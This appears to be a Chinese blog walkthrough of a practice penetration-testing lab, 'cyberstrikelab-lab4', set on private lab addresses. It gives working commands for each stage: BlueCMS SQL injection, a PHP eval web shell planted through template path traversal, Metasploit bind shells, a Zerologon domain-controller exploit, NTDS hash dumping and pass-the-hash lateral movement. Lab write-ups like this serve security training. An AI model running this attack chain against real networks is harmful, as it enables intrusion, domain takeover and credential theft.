+++
series = ["内网渗透 学习记录"]
categories = ["域渗透", "内网渗透", "Web安全"]
tags = ["Web安全", "内网渗透", "域渗透"]
description = "靶机"
title = "cyberstrikelab-lab4"
date = 2026-08-24T09:13:51+08:00
draft = false
pin = false
+++
今天的你是一位白帽工程师，你发现某公司暴露在公网的cms有极其罕见的漏洞，于是你决定帮忙进行测试。

思路

```c
（1）端口扫描192.168.10.10机器发现5820端口开放了web服务 
（2）192.169.10.10:5820端口的web服务bluecms v1.6，存在sql注入 
（3）通过sql注入拿到账号密码：admin/admin123456登录192.168.10.10:5820的后台 
（4）后台存在../../nday写php一句话,上线蚁剑 
（5）正向shell上线c2服务器（msf） 
（6）192.168.10.10机器上线msf（信息收集10.10为工作组机器，不在域内） 
（7）发现存在10和20网段 
（8）上传fscan扫描20网段，发现存活192.168.20.20和192.168.20.30这2台机器 
（9）20.20这台机器存在weblogic，但无法rce 
（10）尝试去打20.30机器，通过fscan扫描的端口存活可知，20.30开放了88端口（kerberos服务）肯定为域控 
（11）获取20.30的机器的主机名（ping -a） 
（12）打zerologon（滞空密码，impact脱hash）
（13）pth打20.20与20.30拿flag
```


# flag1

扫描端口   发现  5820端口

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711104522042.png)


访问发现是bluecms

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711104501804.png)

根据nday   发现存在 sql注入

http://192.168.10.10:5820/ad_js.php?ad_id=1

拿sqlmap 跑  发现确实存在

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711105021149.png)

然后跑出数据库的账户密码  

```c
http://192.168.10.10:5820/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,group_concat(admin_name,0x3a,pwd)%20from%20blue_admin
```

```c
|   |
|---|
|<!--|
|document.write("admin:a66abb5684c45962d887564f08346e8d");|
|-->|
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711105425299.png)

admin   admin123456

登录后台

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711105524867.png)


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711105607228.png)

存在后台rce nday

在模板管理处，右击ann.htm的编辑

访问这个url

```c
http://192.168.10.10:5820/admin/tpl_manage.php?act=edit&tpl_name=ann.htm
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711105755486.png)

然后构造这个  ../../ann.php

```c
http://192.168.10.10:5820/admin/tpl_manage.php?act=edit&tpl_name=../../ann.php
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711105921349.png)

修改为

```c
<?php @eval($_POST['a']);?>
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711110017608.png)

然后保存进行提交

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711110049884.png)

然后进行蚁剑连接

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711110142605.png)

获得flag1

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711110211878.png)

go-flag{ovuRsBeMqji13Rrc}


# flag2

信息收集   发现是10主机最高权限  存在双网卡  10网段和20网段   而且在工作组里

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711110321504.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711110425480.png)


会话转移到  msf 上面

制作正向shell

```c
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o 4444.exe
```

创建4444监听器

```c
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/bind_tcp
msf exploit(multi/handler) > options
msf exploit(multi/handler) > set rhost 192.168.10.10
msf exploit(multi/handler) > run
```

成功上线 msf

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711110928323.png)

继续进行信息收集，上传 fscan 进行扫描  这里是 wsl 记得选mnt 挂载的 路径进行

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711111213636.png)


扫描  20网段

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711111408122.png)


```c
C:\phpstudy_pro\WWW>fscan.exe -h 192.168.20.0/24
fscan.exe -h 192.168.20.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 192.168.20.10   is alive
(icmp) Target 192.168.20.30   is alive
(icmp) Target 192.168.20.20   is alive
[*] Icmp alive hosts len is: 3
192.168.20.20:7001 open
192.168.20.10:3306 open
192.168.20.20:445 open
192.168.20.30:445 open
192.168.20.10:445 open
192.168.20.20:139 open
192.168.20.30:139 open
192.168.20.30:135 open
192.168.20.10:139 open
192.168.20.20:135 open
192.168.20.10:135 open
192.168.20.30:88 open
192.168.20.10:7680 open
[*] alive ports len is: 13
start vulscan
[*] NetInfo
[*]192.168.20.20
   [->]cyberweb
   [->]192.168.20.20
[*] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[*] WebTitle http://192.168.20.20:7001 code:404 len:1164   title:Error 404--Not Found
[+] InfoScan http://192.168.20.20:7001 [weblogic]
已完成 13/13
[*] 扫描结束,耗时: 18.7303887s
```

发现 20主机存在weblogic 

添加路由

```c
run autoroute -s 192.168.20.0/24
run autoroute -p
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711111709956.png)


开启socks5 代理

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711111843472.png)


本地使用socks隧道代理

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711112013917.png)


然后访问

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711112032083.png)

拿nady工具进行扫描   发现不存在漏洞

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711112203715.png)


转到 30 这台域控主机

首先使用enum4探测信息

```c
proxychains enum4linux-ng -A 192.168.20.30 -C 
```

```c
┌──(root㉿kali)-[~]
└─# proxychains enum4linux-ng -A 192.168.20.30 -C 

 ============================================================
|    Domain Information via SMB session for 192.168.20.30    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.20.30:445  ...  OK
[+] Found domain information via SMB
NetBIOS computer name: WIN-7NRTJO59O7N                                                             
NetBIOS domain name: CYBERSTRIKELAB                                                                
DNS domain: cyberstrikelab.com                                                                     
FQDN: WIN-7NRTJO59O7N.cyberstrikelab.com                                                           
Derived membership: domain member                                                                  
Derived domain: CYBERSTRIKELAB  
```

上传mimikatz查询是否存在zerologon漏洞

upload /mnt/z/Desktop/mimikatz.exe

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711121134302.png)

```c
# 1. 运行主程序
mimikatz.exe

# 2. 提升权限
privilege::debug

# 3. 执行打补丁/漏洞检测命令
lsadump::zerologon /target:192.168.20.30 /account:WIN-7NRTJO59O7N$
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711121327490.png)


发现存在这个漏洞

利用这个漏洞： 重置密码

```c
lsadump::zerologon /target:192.168.20.30 /ntlm /null /account:WIN-7NRTJO59O7N$ /exploit
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711121429568.png)


使用impact去脱hash  这里 msf 代理有问题

我切换 vshell 了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711130312883.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711130330162.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711130345314.png)

成功脱hash成功


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711130231924.png)

```c
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:00f995cbe63fd30411f44d434b8dac98:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::
cyberstrikelab.com\cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:5ec3abbedd0da75d8005ace9df885235:::
WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:d348f55167c3beeaad6d1e2a4820b8ab:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:8d74431b0327e988758096706b686561178b506b54c392bc7fc983d795885a4d
Administrator:aes128-cts-hmac-sha1-96:b341d7dde651392ecefbe9d668aa70bc
Administrator:des-cbc-md5:83b5fdef49431929
Administrator:rc4_hmac:00f995cbe63fd30411f44d434b8dac98
krbtgt:aes256-cts-hmac-sha1-96:81eac4fb1383dcbc80cb124aa6074c889f22c4801c0a7825bf8195f77c5cf725
krbtgt:aes128-cts-hmac-sha1-96:65195790b2a7748a2bab4d9fd0e4ef89
krbtgt:des-cbc-md5:196bd04fa28c8531
krbtgt:rc4_hmac:5bc02b7670084dd30471730cc0a1672c
cyberstrikelab.com\cyberweb:aes256-cts-hmac-sha1-96:526cc567241dd83de3c3239db367cc969558522a6231f7257542bf85a7454ca3
cyberstrikelab.com\cyberweb:aes128-cts-hmac-sha1-96:55677ca76ede6687cb63b0c2fcb15274
cyberstrikelab.com\cyberweb:des-cbc-md5:dfad29f2467aa82f
cyberstrikelab.com\cyberweb:rc4_hmac:5ec3abbedd0da75d8005ace9df885235
WIN-7NRTJO59O7N$:aes256-cts-hmac-sha1-96:4715be0a05fa5448f368d1542b1a3117301d9b69ef8044a76256dbfcdce33e93
WIN-7NRTJO59O7N$:aes128-cts-hmac-sha1-96:518e862b4f821ec9894373f2df4bb8b4
WIN-7NRTJO59O7N$:des-cbc-md5:9291ce2a765d6270
WIN-7NRTJO59O7N$:rc4_hmac:31d6cfe0d16ae931b73c59d7e0c089c0
CYBERWEB$:aes256-cts-hmac-sha1-96:e6e3f8897a2cd5f5b38c414d0a9861e77abca2843fc3d420d78842d5d80bb5f9
CYBERWEB$:aes128-cts-hmac-sha1-96:55342b29f05c667389f566bf74ec8e1a
CYBERWEB$:des-cbc-md5:3437f1520beabc79
CYBERWEB$:rc4_hmac:d348f55167c3beeaad6d1e2a4820b8ab
[*] Cleaning up...
```

拿到了  ntml   hash 

```c
Administrator:500:aad3b435b51404eeaad3b435b51404ee:00f995cbe63fd30411f44d434b8dac98:::
```

然后来pth 进行横向

```c
python psexec.py cyberstrikelab.com/Administrator@192.168.20.20 -hashes :00f995cbe63fd30411f44d434b8dac98
```

  
  
发现psexec不稳定  
  
换wmic  
  

```c
python wmiexec.py cyberstrikelab.com/Administrator@192.168.20.20 -hashes :00f995cbe63fd30411f44d434b8dac98
```

  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711131400581.png)  
  
  
go-flag{yJzuQ09FXn0h7Em4}


# flag3


同样的手法
  

```c
python psexec.py cyberstrikelab.com/Administrator@192.168.20.30 -hashes :00f995cbe63fd30411f44d434b8dac98
```

  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260711130616555.png)  
  
go-flag{hAeek65Vho2s199D}




